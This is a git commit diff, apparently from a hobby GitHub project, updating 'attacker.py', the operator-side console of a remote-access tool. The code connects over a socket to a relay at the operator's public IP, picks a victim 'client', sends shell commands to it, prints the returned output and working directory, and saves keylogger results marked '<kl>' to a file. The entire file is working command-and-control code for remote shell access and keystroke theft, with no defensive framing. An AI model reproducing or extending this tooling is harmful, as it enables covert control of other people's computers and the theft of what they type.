30bd719d89c5ece9e54a8a475071fa6292d0996e
3Bixx.py <86367345+3BixxPy@users.noreply.github.com>
2022-04-09 23:37:49 +0200

    Update attacker.py

--- attacker.py
+++ attacker.py
@@ -1,61 +1,47 @@
 import socket
 
-HEADER = 1024
-PORT = your port here
+HEADER = 2048
+PORT = 0  # Replace 0 With Your Port Number
+SERVER = "localhost"  # Replace localhost With Your Public IP
 FORMAT = 'utf-8'
-DISCONNECT_MESSAGE = "!DISCONNECT"
-SERVER = "your public IP here dont remove quotes"
 ADDR = (SERVER, PORT)
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(ADDR)
+attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = attacker.connect_ex(ADDR)
 
 
-def append_new_line(text_to_append):
+def append_text(text):
     with open("kl.txt", "a+") as file_object:
         file_object.seek(0)
         data = file_object.read(10)
         if len(data) > 0:
             file_object.write("\n")
-        file_object.write(text_to_append)
+        for item in str(text).split(","):
+            file_object.write(item)
+            file_object.write("\n")
 
 
 def send(msg):
     message = msg.encode(FORMAT)
-    client.send(message)
+    attacker.send(message)
 
 
 def recieve():
-    klactive = False
     while True:
-        mes = (client.recv(1024))
-        if mes:
-            recieved = mes.decode(FORMAT)
-            if "<sep>" in recieved:
-                cwd, output = recieved.split("<sep>")
-                print("output: " + output)
-                if not klactive:
-                    sendinput = input(cwd + "$>")
-                    if sendinput:
-                        if sendinput == "kl":
-                            klactive = True
-                        send(sendinput)
-                    if not sendinput:
-                        send(" ")
-            if "<kl>" in recieved:
-                append_new_line(recieved.strip("<kl>"))
-                print(recieved.strip("<kl>"))
+        recieved = (attacker.recv(HEADER))
+        result = recieved.decode(FORMAT)
+        if result:
+            return result
 
 
-selectclient = input("select client: ")
-# ATTACKET:CLIENT1
-send("ATTACKER:" + str(selectclient))
+clientnum = input("select client: ")
+send(clientnum + "<?ATTACKER?>cd")
+recieved = recieve()
+output, cwd = recieved.split("<sep>")
 while True:
-    send("cd")
-    mes1 = (client.recv(HEADER))
-    mess = mes1.decode(FORMAT)
-    if mess:
-        break
-
-send("cd")
-recieve()
+    send(clientnum + "<?ATTACKER?>" + input(cwd + "?>"))
+    recieved = recieve()
+    output, cwd = recieved.split("<sep>")
+    if "<kl>" in output:
+        append_text(str(output).strip("<kl>"))
+    print(output)
